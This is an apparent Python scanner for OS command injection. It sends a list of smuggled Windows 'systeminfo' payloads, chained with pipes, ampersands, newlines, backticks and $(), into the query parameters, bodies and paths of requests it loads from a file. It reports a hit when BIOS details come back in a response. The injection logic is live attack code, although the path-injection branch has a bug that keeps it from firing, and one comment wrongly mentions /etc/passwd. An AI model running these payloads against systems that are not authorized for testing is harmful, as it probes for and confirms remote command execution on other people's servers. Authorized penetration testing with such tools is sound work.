#!/usr/bin/env python3
import json
import logging
import asyncio
import httpx
import re
from urllib.parse import urlparse, urljoin, parse_qs
from tabulate import tabulate
from colorama import init, Fore
import signal
import sys

# Initialize colorama
init(autoreset=True)

# Configuration
OSI_PAYLOADS = [
    "systeminfo",
    "|systeminfo|",
    ";systeminfo;",  # Might not work in pure cmd.exe but useful if backend uses PowerShell
    "&systeminfo&",
    "&&systeminfo&&",
    "||systeminfo||",
    "%26systeminfo%26",
    "%26%26systeminfo%26%26",
    "%7Csysteminfo%7C",
    "%7C%7Csysteminfo%7C%7C",
    "%0Asysteminfo",
    "%0Dsysteminfo",
    "%0D%0Asysteminfo",
    "`systeminfo`",  # PowerShell / Unix-style
    "$(systeminfo)"  # PowerShell / Unix-style
]

DEFAULT_TIMEOUT = 50
SEMAPHORE_LIMIT = 5  # concurrency limit

# Global to hold last results so SIGINT can save something useful
last_results = []


def clean_headers(headers):
    """
    Return a copy of headers with Content-Length and Transfer-Encoding removed (case-insensitive).
    """
    if not headers:
        return {}
    return {k: v for k, v in headers.items() if k.lower() not in ("content-length", "transfer-encoding")}


async def inject_OSI_payload(session, request, semaphore):
    """
    Inject OSI payloads into GET params, POST bodies, and paths while avoiding Content-Length mismatches.
    """
    results = []
    url = request["url"]
    method = request.get("method", "GET").upper()
    # copy input headers so we don't mutate original dict
    headers_in = request.get("headers", {}) or {}
    headers = headers_in.copy()
    body = request.get("body")
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    async with semaphore:
        # --- 1. GET requests with query parameters ---
        if method == "GET" and query_params:
            for param, values in query_params.items():
                for payload in OSI_PAYLOADS:
                    modified_params = query_params.copy()
                    modified_params[param] = [payload for _ in values]
                    new_query_string = "&".join(
                        f"{p}={v}" for p, vals in modified_params.items() for v in vals
                    )
                    # Build new URL preserving scheme/netloc and path
                    new_url = parsed_url._replace(query=new_query_string).geturl()

                    # Let test_OSI clean headers centrally; pass a copy
                    result = await test_OSI(session, new_url, method, headers=headers.copy())
                    if result and result["OSI_detected"]:
                        result["query_params"] = query_params
                        result["modified_query_params"] = modified_params
                        result["payload"] = payload
                        results.append(result)
                        break

        # --- 2. POST requests with body payloads ---
        elif method in ("POST", "DELETE", "PATCH", "PUT") and body is not None:
            for payload in OSI_PAYLOADS:
                # Prepare payloaded body but do NOT set Content-Length header
                # We'll pass either data (bytes/str) or json (dict) to httpx and let it handle length
                if isinstance(body, str):
                    modified_body = body + payload
                    data_to_send = modified_body  # str ok, httpx will encode
                    json_to_send = None
                elif isinstance(body, dict):
                    # Use json parameter to allow httpx to correctly set content-length and content-type
                    modified_dict = {k: (v + payload if isinstance(v, str) else v) for k, v in body.items()}
                    data_to_send = None
                    json_to_send = modified_dict
                else:
                    # fallback: stringify and append
                    modified_body = str(body) + payload
                    data_to_send = modified_body
                    json_to_send = None

                # Pass copies of headers -- test_OSI will clean them
                try:
                    result = await test_OSI(session, url, method, headers=headers.copy(), data=data_to_send, json_data=json_to_send)
                    if result and result["OSI_detected"]:
                        result["post_data"] = body
                        result["modified_post_data"] = (json_to_send if json_to_send is not None else data_to_send)
                        result["payload"] = payload
                        results.append(result)
                        break
                except Exception as e:
                    logging.error(f"Error while testing OSI payload (POST) on {url}: {e}")
                    continue

        # --- 3. Path-based OSI injection ---
        if method in ("POST", "DELETE", "PATCH", "PUT", "GET"):
            # split path and preserve empty root handling
            path = parsed_url.path or "/"
            stripped = path.strip("/")
            path_parts = stripped.split("/") if stripped != "" else []
            # if there are no parts (root), we can still try injecting after root by adding parts
            indices = range(len(path_parts))
            for i, part in enumerate(path_parts):
                if part:
                    continue
                for payload in OSI_PAYLOADS:
                    modified_parts = path_parts.copy()
                    modified_parts[i] = part + payload
                    modified_path = '/'.join(path_parts[:i] + [payload])
                    new_url = parsed_url._replace(path=modified_path).geturl()

                    try:
                        result = await test_OSI(session, new_url, method, headers=headers.copy())
                        if result and result["OSI_detected"]:
                            result["path"] = parsed_url.path
                            result["modified_path"] = modified_path
                            result["payload"] = payload
                            results.append(result)
                            break
                    except Exception as e:
                        logging.error(f"Error while testing path-based OSI payload on {new_url}: {e}")
    return results


async def test_OSI(session, url, method, headers=None, data=None, json_data=None):
    """
    Centralized request sender. Cleans headers (removes Content-Length/Transfer-Encoding)
    and uses httpx to send data/json so it calculates Content-Length correctly.
    """
    try:
        # Clean headers case-insensitively
        cleaned_headers = clean_headers(headers or {})
        if logging.getLogger().isEnabledFor(logging.DEBUG):
            present = ", ".join(k for k in (headers or {}).keys())
            cleaned = ", ".join(k for k in cleaned_headers.keys())
            logging.debug(f"Request -> {method} {url}")
            logging.debug(f"Original headers present: {present}")
            logging.debug(f"Cleaned headers sent: {cleaned}")

        # Use httpx to send either data (str/bytes) or json (dict)
        response = await session.request(method, url, headers=cleaned_headers, data=data, json=json_data, timeout=DEFAULT_TIMEOUT)

        # Look for /etc/passwd-like entries
        if re.search(r'BIOS Version:', response.text):
            return {
                "url": url,
                "method": method,
                "status_code": response.status_code,
                "OSI_detected": True
            }
        return {
            "url": url,
            "method": method,
            "status_code": response.status_code,
            "OSI_detected": False
        }
    except httpx.RequestError as e:
        logging.error(f"HTTP error testing {url}: {e}")
        return {
            "url": url,
            "method": method,
            "status_code": "Error",
            "OSI_detected": False,
            "error": str(e)
        }
    except Exception as e:
        logging.error(f"Unexpected error testing {url}: {e}")
        return {
            "url": url,
            "method": method,
            "status_code": "Error",
            "OSI_detected": False,
            "error": str(e)
        }


async def process_requests(requests):
    """
    Process all requests and check for OSI vulnerabilities.
    """
    semaphore = asyncio.Semaphore(SEMAPHORE_LIMIT)
    async with httpx.AsyncClient() as session:
        tasks = [inject_OSI_payload(session, request, semaphore) for request in requests]
        results = await asyncio.gather(*tasks)
        # flatten
        flattened = [item for sublist in results for item in sublist]
        return flattened


def load_requests(file_path):
    with open(file_path, 'r') as f:
        return json.load(f)


def save_results(results, output_file):
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=4)


def save_output_on_exit(sig, frame):
    """
    Signal handler to save last_results on exit.
    """
    global last_results
    logging.info("Interrupted — saving last results to output_on_interrupt.json ...")
    try:
        with open("output_on_interrupt.json", "w") as f:
            json.dump(last_results, f, indent=4)
        logging.info("Saved output_on_interrupt.json")
    except Exception as e:
        logging.error(f"Failed to save output on exit: {e}")
    sys.exit(0)


def print_results(results):
    OSI_results = [result for result in results if result.get("OSI_detected")]
    if not OSI_results:
        print(Fore.YELLOW + "No OSI vulnerabilities detected.")
        return

    table_data = []
    for result in OSI_results:
        table_data.append([
            result.get("url"),
            result.get("method"),
            result.get("status_code"),
            Fore.RED + "OSI Detected"
        ])
    headers = ["URL", "Method", "Status Code", "OSI Detection"]
    print(tabulate(table_data, headers, tablefmt="grid", stralign="center"))


async def main(input_file, output_file):
    global last_results
    requests = load_requests(input_file)
    logging.info(f"Loaded {len(requests)} requests for testing.")

    results = await process_requests(requests)
    # Filter results to only include OSI detections
    OSI_results = [result for result in results if result.get("OSI_detected")]
    last_results = OSI_results  # keep for SIGINT save

    print_results(OSI_results)
    save_results(OSI_results, output_file)


if __name__ == "__main__":
    parser = argparse = __import__("argparse").ArgumentParser(description="OSI Detection Tool")
    parser.add_argument("--input", default="requests.json", help="Input file with requests")
    parser.add_argument("--output", default="OSI_win.json", help="Output file for results")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
    args = parser.parse_args()

    signal.signal(signal.SIGINT, save_output_on_exit)

    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
    )

    try:
        asyncio.run(main(args.input, args.output))
    except KeyboardInterrupt:
        print("\nExecution interrupted by user.")

